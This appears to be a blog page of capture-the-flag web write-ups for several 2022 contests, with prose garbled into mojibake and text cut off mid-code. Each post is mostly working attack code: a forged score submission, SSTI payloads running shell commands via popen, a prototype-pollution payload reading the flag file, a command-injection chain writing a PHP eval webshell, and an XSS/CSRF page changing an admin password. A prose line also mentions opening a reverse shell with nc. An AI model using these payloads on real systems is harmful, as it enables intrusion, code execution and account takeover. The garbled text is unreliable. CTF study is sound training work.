<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content=""><meta name="keywords" content=""><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><title>cyxin</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '6.0.0'
} </script><meta name="generator" content="Hexo 6.0.0"></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">John Doe</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">35</span></a></div></div></div><nav id="nav" style="background-image: url(https://cdn.eso.org/images/screen/eso0932a.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">cyxin</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a></span></div><div id="site-info"><div id="site-title">cyxin</div><div id="site-sub-title"></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2022/09/24/DASCTF%20X%20CBCTF%202022%E4%B9%9D%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B%EF%BC%88web%E9%83%A8%E5%88%86%EF%BC%89%20/">No title</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-09-24</time><div class="content"><hr>
<h2 id="DASCTF-X-CBCTF-2022ä¹æœˆæŒ‘æˆ˜èµ›ï¼ˆwebéƒ¨åˆ†ï¼‰"><a href="#DASCTF-X-CBCTF-2022ä¹æœˆæŒ‘æˆ˜èµ›ï¼ˆwebéƒ¨åˆ†ï¼‰" class="headerlink" title="DASCTF X CBCTF 2022ä¹æœˆæŒ‘æˆ˜èµ›ï¼ˆwebéƒ¨åˆ†ï¼‰"></a>DASCTF X CBCTF 2022ä¹æœˆæŒ‘æˆ˜èµ›ï¼ˆwebéƒ¨åˆ†ï¼‰</h2><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="dino3d"><a href="#dino3d" class="headerlink" title="dino3d"></a>dino3d</h2><p><img src="https://img-blog.csdnimg.cn/98371c199af54aafb1365732f8318399.png"><br>åœ¨åšæ¸¸æˆçš„æ—¶å€™å‘ç°å­˜åœ¨check.phpï¼Œæˆ–è€…ç›´æ¥æ‰«ç›®å½•ä¹Ÿå¯ä»¥å‘ç°<br>è¿™é‡Œå¾—åˆ°æ¥æºï¼Œçœ‹å‘åŒ…æ ¼å¼<br><img src="https://img-blog.csdnimg.cn/40855bdf301c4a53a045e07c7ee46dd6.png"><br>è·Ÿè¸ªsnå‡½æ•°çœ‹å…¶ä»å“ªé‡Œè°ƒç”¨å‘ç°<br><img src="https://img-blog.csdnimg.cn/caffd334ee6349eab79d4c3b197963bb.png"><br>å¯ä»¥å‘ç°eæ˜¯åˆ†æ•°ï¼Œtä¸ºcheckcodeï¼Œè·Ÿè¸ªcheckcodeå¯ä»¥å¾—åˆ°<br><img src="https://img-blog.csdnimg.cn/bf7cc6eda28d4a29a5e24144261ebb5b.png"><br><img src="https://img-blog.csdnimg.cn/ffa80e3c30244b5a92af9e43c1ea45e9.png"><br>æ‹¼æ¥å¾—åˆ°checkcodeä¸ºDASxCBCTF_wElc03e<br>tmçš„å‚æ•°æ˜¯æ—¶é—´æˆ³ã€scoreæ˜¯åˆ†æ•°<br>ä»è€Œå¯ä»¥æ„é€ åŒ…è¿›è¡Œå‘åŒ…</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://node4.buuoj.cn:25299/check.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getFlag</span>():</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;score&quot;</span>: <span class="number">1000000</span>,</span><br><span class="line">        <span class="string">&quot;checkCode&quot;</span>: md5(<span class="string">&quot;1000000DASxCBCTF_wElc03e&quot;</span>.encode()).hexdigest(),</span><br><span class="line">        <span class="string">&quot;tm&quot;</span>: <span class="built_in">int</span>(time.time())</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url, data = data)</span><br><span class="line">    <span class="keyword">return</span> res.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(getFlag())</span><br></pre></td></tr></table></figure>

<h2 id="web-Text-Reverser"><a href="#web-Text-Reverser" class="headerlink" title="web Text Reverser"></a>web Text Reverser</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/107752717">sstiä¸€äº›ç®€ä»‹</a><br><img src="https://img-blog.csdnimg.cn/1fd9f92d16c3409988f0614fc735d68f.png"><br><img src="https://img-blog.csdnimg.cn/8bef4c24fccd44f0b9c8e68d111cd62e.png"><br>ä¹‹åå°è¯•æ„é€ paylaod<br>è·å¾—å­ç±»</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">output = <span class="string">&#x27;&#x27;&#x27;&#123;% print &quot;&quot;.__class__.__bases__[0].__subclasses__()%&#125;&#x27;&#x27;&#x27;</span>[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(output)</span><br></pre></td></tr></table></figure>
<p>æˆ–è€…åˆ©ç”¨è¿™ä¸ª<br>å¯ä»¥æ›´æ¢â€â€ä¸ºâ€™â€™è¿›è¡Œå°è¯•</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a =<span class="string">&#x27;&#x27;&#x27;&#123;% print &quot;&quot;.__class__.__mro__[2].__subclasses__() %&#125;&#x27;&#x27;&#x27;</span>[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure>
<p>å‘é€åè½¬åçš„payload å¾—åˆ°ç±»åˆ—è¡¨ï¼Œç„¶åå°†è¿”å›çš„åˆ—è¡¨å†…å®¹å¤åˆ¶è¿›è„šæœ¬å¯»æ‰¾å¯åˆ©ç”¨çš„ç±»</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">a = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;class &#x27;type&#x27;&gt;...&lt;class &#x27;unicodedata.UCD&#x27;&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line">allList = []</span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&quot;&gt;&quot;</span>:</span><br><span class="line">        result += i</span><br><span class="line">        allList.append(result)</span><br><span class="line">        result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;n&quot;</span> <span class="keyword">or</span> i == <span class="string">&quot;,&quot;</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result += i</span><br><span class="line">        </span><br><span class="line"><span class="keyword">for</span> k,v <span class="keyword">in</span> <span class="built_in">enumerate</span>(allList):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;os._wrap_close&quot;</span> <span class="keyword">in</span> v:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(k)+<span class="string">&quot;---&gt;&quot;</span>+v)</span><br><span class="line"><span class="comment">#è¿”å›ç»“æœ:132---&gt; &lt;class &#x27;os._wrap_close&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
<p>ä¹‹åå°±æ˜¯åˆ©ç”¨popenè¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">print</span> <span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">132</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>).read()%&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œè¿‡æ»¤äº†å¾ˆå¤šè¯»å–æ–‡ä»¶çš„å‘½ä»¤ï¼Œå¯ä»¥åˆ©ç”¨ nlçš„ç»•è¿‡è¿‡æ»¤è¯»å–æ–‡ä»¶ï¼ˆåæµ‹è¯•ç”¨grepï¼Œrevï¼Œtailç­‰å‘½ä»¤ä¹Ÿå¯ä»¥è¯»å–flagï¼‰</p>
<h2 id="web-cbshop"><a href="#web-cbshop" class="headerlink" title="web cbshop"></a>web cbshop</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/xiaoxiaocainiao_/article/details/126970812">åŸå‹é“¾ä»‹ç»</a><br><img src="https://img-blog.csdnimg.cn/855c7c0a92a34c728284c6c1ebcc2ac1.png"><br>æ‹¿åˆ°é¢˜ç›®å®¡è®¡æºç <br>å‘ç°<br><img src="https://img-blog.csdnimg.cn/755c98d5bc354fd3993fadec174e5134.png"><br><img src="https://img-blog.csdnimg.cn/a207198cde3e40f58bedf80a1f6254e8.png"><br>äºæ˜¯å¾—åˆ°adminå¯†ç ï¼ˆå°†ğŸ˜€adminğŸ˜€æ”¾å…¥æµè§ˆå™¨ï¼‰<br><img src="https://img-blog.csdnimg.cn/046eb6b49cb14875abbc3415fcf46e7d.png"><br>å¾—åˆ°å¯†ç åå‘ç°è¿˜ä¸è¡Œï¼Œäºæ˜¯ç»§ç»­å®¡è®¡å‘ç°è¿˜éœ€è¦token<br><img src="https://img-blog.csdnimg.cn/c340534731a144ec99709de76b4a0b66.png"><br>ä½†æ˜¯åœ¨å…¶ä»–åœ°æ–¹æ ¹æœ¬å°±æ‰¾ä¸åˆ°tokené€šè¿‡ä»”ç»†è§‚å¯Ÿå‘ç°<br><img src="https://img-blog.csdnimg.cn/9db90d10d9d24445bd94dba64f37e56c.png"><br>å­˜åœ¨åŸå‹é“¾æ±¡æŸ“æ¼æ´<br><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1841463#:~:text=%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E9%80%9A%E5%B8%B8%E4%BC%9A,%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E7%AD%89%E6%BC%8F%E6%B4%9E%E3%80%82">åŸå‹é“¾æ±¡æŸ“æ¼æ´è®²è§£</a><br>æ ¹æ®ä¸Šé¢è®²è§£çš„æ¯”å¯¹å‘ç°å­˜åœ¨CVE-2021-25928<br>é€šè¿‡åˆ†æå‘ç°</p>
<blockquote>
<p>product å¯¹è±¡æ˜¯æˆ‘ä»¬postçš„jsonæ•°æ®è½¬åŒ–è€Œæ¥ï¼Œæˆ‘ä»¬å®Œå…¨å¯æ§ï¼Œè€Œè¿™é‡Œå¦‚æœæˆ‘ä»¬çš„ user.username æ˜¯ __proto__ï¼Œè¿™æ ·çš„è¯å°±ä¼šå°† product å¯¹è±¡åˆå¹¶åˆ° order çš„ <strong>proto</strong> ä¸­ï¼Œè€Œuser å’Œ order çš„åŸå‹éƒ½æ˜¯ Object ï¼Œæ˜¯åŒä¸€ä¸ªåŸå‹ï¼Œå½“ product ä¸­æ„é€  token:true æ—¶ï¼Œuser.token è®¿é—®ä¸º trueå³åªéœ€è¦ç™»å½•adminåä¿®æ”¹ç”¨æˆ·åä¸º <strong>ptoto</strong></p>
</blockquote>
<p>äºæ˜¯ä¿®æ”¹ç”¨æˆ·åä¸º__ptoto__ï¼Œä¹‹åæ„é€ product<br>è¿™é‡Œç”±äºæŠŠflagç»™è¿‡æ»¤äº†ï¼Œéœ€è¦ç»•è¿‡<br>ç¨‹åºä¼šå°†jsonè½¬åŒ–ä¸ºå¯¹è±¡<br>jsonä¸­å°†nameçš„å€¼ä¿®æ”¹ä¸ºä¸€ä¸ªå¯¹è±¡ {} å‘é€å¯ä»¥çœ‹åˆ°è¿™æ ·çš„æŠ¥é”™</p>
<blockquote>
<p>TypeError [ERR_INVALID_ARG_TYPE]: The â€œpathâ€ argument must be of type string or an instance of Buffer or URL. Received an instance of Object</p>
</blockquote>
<p>å¯ä»¥å‘ç°ä¼ å…¥çš„å‚æ•°ä¸åªæ˜¯å­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ª URL å®ä¾‹ æœ¬åœ°æµ‹è¯•å‘ç°<br>ä½¿ç”¨URL å®ä¾‹å¯ä»¥æ­£å¸¸è¯»å–æ–‡ä»¶ï¼Œå°† flag è¿›è¡Œurlç¼–ç ä»è€Œç»•è¿‡ï¼Œé‚£æ„é€ ä¸€ä¸ªURLå¯¹è±¡å³å¯</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;href&quot;</span>: <span class="string">&#x27;file:///fl%61g&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;origin&quot;</span>: <span class="string">&#x27;null&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;protocol&quot;</span>: <span class="string">&#x27;file:&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;host&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;hostname&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;port&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;pathname&quot;</span>: <span class="string">&#x27;/fl%61g&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;search&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;searchParams&quot;</span>: <span class="string">&quot;URLSearchParams &#123;&#125;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;hash&quot;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;id&quot;</span>:2,</span><br><span class="line">    <span class="string">&quot;token&quot;</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/08/06/ctfshow%20%E4%B8%83%E5%A4%95%E6%9D%AF/">ä¸ƒå¤•æ¯ï¼ˆwebéƒ¨åˆ†ï¼‰</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-08-06</time><div class="content"><h2 id="webç­¾åˆ°"><a href="#webç­¾åˆ°" class="headerlink" title="webç­¾åˆ°"></a>webç­¾åˆ°</h2><p>æ‹¿åˆ°é¢˜ç›® è®©æ‰§è¡Œå­—ç¬¦é•¿åº¦å°äº7çš„å‘½ä»¤<br>åˆ©ç”¨å¤§ä½¬åšå®¢<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/nzjdsds/article/details/102873187">å¤§ä½¬åšå®¢</a><br>å¾—åˆ°payload</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&gt;hp</span><br><span class="line">&gt;1.p\\</span><br><span class="line">&gt;d\&gt;\\</span><br><span class="line">&gt;\ -\\</span><br><span class="line">&gt;e64\\</span><br><span class="line">&gt;bas\\</span><br><span class="line">&gt;7\|\\</span><br><span class="line">&gt;XSk\\</span><br><span class="line">&gt;Fsx\\</span><br><span class="line">&gt;dFV\\</span><br><span class="line">&gt;kX0\\</span><br><span class="line">&gt;bCg\\</span><br><span class="line">&gt;XZh\\</span><br><span class="line">&gt;AgZ\\</span><br><span class="line">&gt;waH\\</span><br><span class="line">&gt;PD9\\</span><br><span class="line">&gt;o\ \\</span><br><span class="line">&gt;ech\\</span><br><span class="line">ls -t&gt;0</span><br><span class="line">sh 0</span><br></pre></td></tr></table></figure>
<h2 id="easy-calc"><a href="#easy-calc" class="headerlink" title="easy_calc"></a>easy_calc</h2><p>æœ¬é¢˜è€ƒå¯Ÿincludeå‡½æ•°åŒ…å«æ—¥å¿—</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(check(<span class="variable">$code</span>))&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;$result=&#x27;</span>.<span class="string">&quot;<span class="subst">$code</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$result</span>);    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">&amp;<span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$num1</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;num1&#x27;</span>];</span><br><span class="line">    <span class="variable">$symbol</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;symbol&#x27;</span>];</span><br><span class="line">    <span class="variable">$num2</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;num2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$num1</span>) || !<span class="keyword">isset</span>(<span class="variable">$num2</span>) || !<span class="keyword">isset</span>(<span class="variable">$symbol</span>) )&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/!|@|#|\\$|\%|\^|\&amp;|\(|_|=|&#123;|&#x27;|&lt;|&gt;|\?|\?|\||`|~|\[/&quot;</span>, <span class="variable">$num1</span>.<span class="variable">$num2</span>.<span class="variable">$symbol</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/^[\+\-\*\/]$/&quot;</span>, <span class="variable">$symbol</span>))&#123;</span><br><span class="line">        <span class="variable">$code</span> = <span class="string">&quot;<span class="subst">$num1</span><span class="subst">$symbol</span><span class="subst">$num2</span>&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>çœ‹åˆ°æºç åå¼€å§‹ä¼ å‚<br>payload<br><img src="https://img-blog.csdnimg.cn/50c0e650ca304d1a9a2a6263f69ec699.png"></p>
<h2 id="easy-cmd"><a href="#easy-cmd" class="headerlink" title="easy-cmd"></a>easy-cmd</h2><p>ç›´æ¥åˆ©ç”¨ncè¿›è¡Œvpså¼¹shellä»è€Œå¾—åˆ°flag</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/08/06/%E5%BC%BA%E7%BD%91%E6%9D%AF%EF%BC%88%E9%83%A8%E5%88%86%EF%BC%89/">å¼ºç½‘æ¯ï¼ˆéƒ¨åˆ†ï¼‰</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-08-06</time><div class="content"><h2 id="babyweb"><a href="#babyweb" class="headerlink" title="babyweb"></a>babyweb</h2><p> é¢˜ç›®æ‰“å¼€ï¼Œå…ˆæ³¨å†Œç™»å½•ä¸€ä¸ªè´¦å·ï¼Œçœ‹æºç å‘ç°åˆ©ç”¨websocketè¿›è¡Œæ•°æ®å‘é€<br> é€šè¿‡ bugreportçœ‹ä»¥é€šå¤–ç½‘<br> äºæ˜¯åˆ©ç”¨xss+csrfè¿›è¡Œå¯†ç ä¿®æ”¹<br> åœ¨vpsä¸Šåˆ›å»ºhtmlæ–‡ä»¶ï¼Œ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="line">&lt;head&gt; </span><br><span class="line">	&lt;title&gt;&lt;/title&gt; </span><br><span class="line">	&lt;script&gt; </span><br><span class="line">		var url =</span><br><span class="line">	<span class="string">&quot;ws://127.0.0.1:8888/bot&quot;</span>; </span><br><span class="line">		var ws = new WebSocket(url); </span><br><span class="line">ws.onopen= <span class="keyword">function</span> (event) &#123; ws.send(<span class="string">&quot;changepw123&quot;</span>); &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>8888ç«¯å£æ˜¯ç»è¿‡å°è¯•åˆ¤æ–­å‡ºæ¥çš„<br>å‘é€bugreport <a href="http://ip:port/1.html">http://ip:port/1.html</a><br>ç™»å½•admin ä¹°æç¤ºå¾—åˆ°æºç <br>è¿›è¡Œå®¡è®¡<br><img src="https://img-blog.csdnimg.cn/a9994b86b51a4d8e8a6302c62c9812db.png"><br>å®¡è®¡ä¼ ä¸¤ä¸ªproductï¼ˆï¼‰<br><img src="https://img-blog.csdnimg.cn/c74394f5bdea47439bf5f220ab8a83e6.png"><br>å¾—åˆ°flag</p>
<h2 id="carsh"><a href="#carsh" class="headerlink" title="carsh"></a>carsh</h2><p>ä¸ä¼š  ä¹‹åçœ‹å…¶ä»–äººå†™çš„åå†™çš„è¦ç‚¹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment"># import sqlite3</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, make_response,request, session</span><br><span class="line"><span class="keyword">import</span> admin</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">app = Flask(__name__,static_url_path=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">app.secret_key=random.randbytes(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, username,password</span>):</span></span><br><span class="line">        self.username=username</span><br><span class="line">        self.token=<span class="built_in">hash</span>(password)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_password</span>(<span class="params">username</span>):</span></span><br><span class="line">    <span class="keyword">if</span> username==<span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> admin.secret</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># conn=sqlite3.connect(&quot;user.db&quot;)</span></span><br><span class="line">        <span class="comment"># cursor=conn.cursor()</span></span><br><span class="line">        <span class="comment"># cursor.execute(f&quot;select password from usertable where username=&#x27;&#123;username&#125;&#x27;&quot;)</span></span><br><span class="line">        <span class="comment"># data=cursor.fetchall()[0]</span></span><br><span class="line">        <span class="comment"># if data:</span></span><br><span class="line">        <span class="comment">#     return data[0] </span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     return None</span></span><br><span class="line">        <span class="keyword">return</span> session.get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/balancer&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span>():</span></span><br><span class="line">    pickle_data=base64.b64decode(request.cookies.get(<span class="string">&quot;userdata&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> <span 